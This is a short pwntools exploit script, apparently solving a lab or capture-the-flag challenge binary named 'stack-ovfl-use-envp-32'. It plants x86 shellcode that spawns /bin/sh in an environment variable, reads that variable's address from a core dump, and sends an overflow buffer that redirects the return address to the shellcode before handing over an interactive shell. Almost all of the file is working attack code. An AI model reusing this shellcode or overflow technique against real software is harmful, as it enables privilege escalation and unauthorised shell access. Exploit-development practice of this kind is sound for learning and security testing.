#!/usr/bin/env python
from pwn import *

env = {'SHELLCODE' : 'j2X\xcd\x80PP[YjGX\xcd\x801\xc91\xd2j\x0bX\x99Rhn/shh//biT[\xcd\x80'}

#p = process('./stack-ovfl-use-envp-32', env=env)

#print(p.recv(0x100))
#buff = "A" * 0x88 + "A" * 4 + "BBBB"
#p.send(buff)
#p.wait()

c = Core('core')
#buff_addr = c.stack.find(buff)
buff_addr = c.env['SHELLCODE']
print(hex(buff_addr))


#buf = "A" * (0x88 +4 ) + p32(buff_addr)
#buf = SHELLCODE
buf = "A" * (0x14-4)
buf += p32(buff_addr)
p = process('./stack-ovfl-use-envp-32', env=env)
#p = process("./stack-ovfl-sc-32")
p.sendline(buf)

p.interactive()

